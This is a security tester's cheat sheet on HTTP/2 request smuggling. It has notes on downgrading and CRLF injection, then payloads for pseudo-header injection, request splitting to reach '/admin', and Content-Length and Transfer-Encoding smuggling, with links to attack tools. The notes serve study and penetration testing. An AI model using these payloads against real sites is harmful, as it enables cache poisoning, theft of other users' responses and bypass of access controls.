# HTTP/2 Request Smuggling




###### notes:
- downgrading is converting HTTP/2 to HTTP/1.1 in the proxy server or load balancer because the backend server speaks only HTTP/1.1
- some proxy servers force to speak only  with HTTP/1.1 with the backend server 
- request queue poisoning is a technique to steal user's response by sending 2 requests in one connection 
- Smuggling  via CRLF occurs when the backend treat `\n` as delimiter and the frontend doesn't.
	- e.g: `Foo: bar\nTransfer-Encoding: chunked`
- Smuggling HTTP/2 via full CRLF `\r\n` is possible because delimiters has no special significance because the request is in binary, when H2 downgraded: CRLF attack
- bypassing frontend headers filtering using colons in H2 request
	- e.g: `foo: bar\r\nTransfer-Encoding: chunked\r\nX:` `Ignored by filter`
- HTTP2  has `pseudo-headers` which they are:
	-   `:method` - The request method.
	-   `:path` - The request path. Note that this includes the query string.
	-   `:authority` - Roughly equivalent to the HTTP/1 `Host` header.
	-   `:scheme` - The request scheme, typically `http` or `https`.
	-   `:status` - The response status code (not used in requests).
- interesting attacks can be constructed by combaning `HTTP/1.1` headers with them.
- duplicated pseudo-header might be allowed for constructing host header attacks, even in path.
- [read](https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors) more about new attack vectors in HTTP2 
- constructing request splitting is adding new requests in request headers in H2
	- e.g: `Foo: Sora\r\n\r\nGET /admin HTTP/1.1\r\nHost: victim.com`
- may need to put `Host: ` before the splitted request, and other necessary headers in same way.
	- e.g: `Foo: Sora\r\nHost: victim.com\r\n\r\nGET /admin\r\n` 
- continue reading [HTTP request tunneling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling)
- check if the site support H2 `curl --http2 --http2-prior-knowledge`


###### payloads
- URL prefix injection ":scheme" in H2 and H2 downgrade:
```HTTP
:method GET
:path //file.js
:authority start.mozilla.org
:scheme http:/1/start.mozilla.org/xyz?
```
- header name splitting
```HTTP
:method GET
:path /file.js
:authority apache.org
host: attacker.com 443
```
- request line injection
 ```HTTP
:method GET /admin HTTP/1.1
:path /fakepath
:authority apache.org
```

- Turbo intruder script for request smuggling via [CL.CL](https://gist.github.com/DanielIntruder/ddd773e95ad78895cedb064401a938fa), edit the `nonexisting` path to perform cache poisoning
- simple overwriting content-length payload
```http
GET / HTTP/1.1
Content-Length: 0

SMUGGLED
```
- simple overwriting Transfer-Encoding payload
```http
GET / HTTP/1.1
Transfer-Encoding: chunked

0

SMUGGLED
```
###### tools:
- [http2smugl](https://github.com/neex/http2smugl)
- [htsmuggler](https://github.com/BishopFox/h2csmuggler)
- [param-miner](https://github.com/intruder-io/param-miner)